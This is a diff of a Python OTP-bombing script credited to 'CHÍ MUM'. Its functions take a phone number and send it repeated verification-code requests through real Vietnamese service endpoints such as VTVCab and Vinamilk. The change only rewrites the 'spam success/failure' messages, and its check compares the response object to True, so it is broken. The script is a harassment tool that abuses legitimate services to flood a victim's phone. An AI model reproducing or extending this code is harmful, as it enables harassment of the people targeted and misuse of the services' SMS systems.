@@ -94,7 +94,14 @@ def send_otp_via_vtvcab(sdt):
     }
 
     response = requests.post('https://apigateway.vtvcab.vn/mycab/api/v2/id/sync-otp', headers=headers, json=json_data)
-    print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THÀNH CÔNG')
+    try:
+        if response == True:
+            print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THÀNH CÔNG')
+        else:
+            print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THẤT BẠI')
+    except:
+        print(f'[BY: CHÍ MUM] ~ VTVCAB SPAM THẤT BẠI')
+
 
 
 def send_otp_via_cashbar(sdt):
@@ -137,7 +144,14 @@ def send_otp_via_cashbar(sdt):
     }
     data = '{"type":"register","phone":"' + sdt + '"}'
     response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
-    print(f'[BY: CHÍ MUM] ~ VINAMILK SPAM THÀNH CÔNG')
+    try:
+        if response == True:
+            print(f'[BY: CHÍ MUM] ~ Vinamik SPAM THÀNH CÔNG')
+        else:
+            print(f'[BY: CHÍ MUM] ~ Vinamilk SPAM THẤT BẠI')
+    except:
+        print(f'[BY: CHÍ MUM] ~ Vinamilk SPAM THẤT BẠI')
+
 
 
 def send_otp_via_pizzacompany(sdt):
